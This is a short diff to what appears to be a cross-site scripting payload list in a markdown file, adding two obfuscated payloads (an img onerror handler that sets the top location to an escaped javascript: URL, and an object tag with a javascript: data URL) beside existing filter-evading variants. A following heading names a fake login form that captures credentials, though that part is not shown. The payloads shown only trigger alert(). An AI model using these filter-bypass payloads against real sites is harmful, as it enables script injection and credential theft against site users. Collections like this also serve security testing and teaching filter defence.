@@ -14,6 +14,8 @@
 <iNpUt /&#62; id=""onfocus="window['\a\l\ert']()" autofocus/>
 <iMG src &gt; onerror="alert&#x000000028;&#x29;" />
 <iMG src onload=%ff%00%ffAAA onerror=alert() />
+<iMG onerror="top['loc\u{61}tion'] = 'javascript:alert\u{28})'" src />
+<oBjECt data="javascript:window['\a\l\ert']()" />
 ```
 
 ### Fake authentication form sending credentials in keylogger mode
